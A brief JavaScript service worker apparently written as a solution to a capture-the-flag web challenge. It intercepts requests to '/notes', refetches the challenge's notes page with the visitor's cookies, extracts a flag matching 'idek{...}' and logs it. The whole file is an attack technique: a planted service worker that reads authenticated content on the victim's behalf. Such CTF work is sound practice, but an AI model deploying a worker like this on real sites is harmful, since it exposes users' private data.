self.addEventListener("fetch", (event) => {
  const url = new URL(event.request.url);

  if (url.pathname === "/notes") {
    event.respondWith(
      (async () => {
        const response = await fetch("https://fnotes-web.ctf-chal.idek.team/notes/", {
          credentials: "include"
        });
        const text = await response.text();

        const match = text.match(/idek{.*?}/);
        if (match) {
          console.log("[FLAG]", match[0]);
        } else {
          console.log("[INFO] No flag found yet");
        }

        return new Response(text, {
          headers: response.headers,
          status: response.status,
        });
      })()
    );
  }
});
